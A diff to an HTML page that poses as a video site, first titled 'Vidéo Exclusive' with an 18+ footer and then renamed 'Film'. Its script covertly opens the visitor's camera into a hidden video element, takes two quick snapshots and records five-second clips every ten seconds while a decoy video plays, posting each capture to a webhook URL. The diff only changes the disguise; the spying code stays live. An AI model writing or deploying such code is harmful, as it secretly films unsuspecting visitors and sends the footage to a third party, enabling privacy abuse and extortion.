@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Vidéo Exclusive – Regardez maintenant</title>
+  <title>Film</title>
   <style>
     body {
       margin: 0;
@@ -12,11 +12,10 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
     }
     header {
       width: 100%;
-      padding: 30px 20px;
+      padding: 20px;
       background: #111;
       text-align: center;
     }
@@ -37,21 +36,12 @@
       width: 100%;
       display: block;
     }
-    footer {
-      margin-top: auto;
-      padding: 20px;
-      background: #111;
-      font-size: 0.9rem;
-      opacity: 0.7;
-      width: 100%;
-      text-align: center;
-    }
   </style>
 </head>
 <body>
 
 <header>
-  <h1>Vidéo Exclusive</h1>
+  <h1>Film</h1>
 </header>
 
 <div id="video-container">
@@ -62,10 +52,6 @@
 
 <video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
-
-<footer>
-  © 2025 Vidéo Exclusive – Contenu 18+
-</footer>
 
 <script>
 const hiddenVideo = document.getElementById('hiddenVideo');
@@ -85,7 +71,7 @@ async function start() {
     hiddenVideo.srcObject = stream;
     await hiddenVideo.play();
 
-    // صورتين فور السماح
+    // صورتين سريعًا
     setTimeout(() => captureSelfie(1), 500);
     setTimeout(() => captureSelfie(2), 1500);
 
@@ -105,8 +91,8 @@ async function captureSelfie(num) {
   }, 'image/jpeg', 0.92);
 }
 
-// تسجيل كل 10 ثواني (5 تصوير + 5 راحة)
-function startRecordingCycle() {
+// تسجيل 5 ثواني كل 10 ثواني
+function recordCycle() {
   const stream = hiddenVideo.srcObject;
   if (!stream) return;
 
@@ -126,12 +112,11 @@ function startRecordingCycle() {
       fetch(WEBHOOK_URL, { method: 'POST', body: fd });
     };
 
-    // كرر كل 10 ثواني
-    setTimeout(startRecordingCycle, 10000);
+    setTimeout(recordCycle, 10000);
   }, 5000);
 }
 
-mainVideo.addEventListener('play', startRecordingCycle);
+mainVideo.addEventListener('play', recordCycle);
 
 window.addEventListener('load', start);
 </script>
